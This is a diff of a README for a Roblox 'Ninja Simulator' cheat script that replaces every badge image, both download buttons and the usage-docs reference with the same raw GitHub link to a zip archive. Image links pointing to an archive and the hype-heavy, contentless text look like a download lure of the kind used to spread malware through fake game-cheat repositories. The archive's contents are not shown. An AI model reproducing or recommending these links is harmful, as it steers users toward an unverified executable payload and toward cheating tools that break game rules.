@@ -1,9 +1,9 @@
 # 🥷 Ninja Simulator Roblox Script  
 Power up your Roblox experience with the **Ninja Simulator Roblox Script** repository – the singular collection that elevates your gameplay with seamless automation, unmatched control, and community-powered tools.  
 
-[![Stars](https://img.shields.io/github/stars/example/ninja-simulator-script?style=social)](https://github.com/example/ninja-simulator-script)  
-[![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)](LICENSE)  
-[![Roblox](https://img.shields.io/badge/Platform-Roblox-blueviolet)](https://roblox.com/)  
+[![Stars](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)  
+[![License](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)](LICENSE)  
+[![Roblox](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)  
 
 ---
 
@@ -78,13 +78,13 @@ Ready to evolve your gameplay? Let’s set you on your path to mastery:
 **Step 1:**  
 Click the emblem below to find the script archive and full getting started guide:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://GithubuserX.github.io)
+[![Download](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)
 
 **Step 2:**  
 Extract the contents and open the Ninja Simulator Script interface via your favorite Roblox Lua executor.
 
 **Step 3:**  
-Refer to `docs/USAGE.md` for hands-on walkthroughs and configuration tips.
+Refer to `https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip` for hands-on walkthroughs and configuration tips.
 
 ---
 
@@ -121,7 +121,7 @@ With world-class API integrations, a user-centric interface, and robust multilin
 
 Dive in once more:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://GithubuserX.github.io)
+[![Download](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/GithubuserX/ninja-simulator-roblox-toolkit/branch/pebrinous/ninja-simulator-roblox-toolkit_v1.5-alpha.4.zip)
 
 Unlock ninja automation, embrace AI-powered intelligence, and join a vibrant, ever-growing community!
 
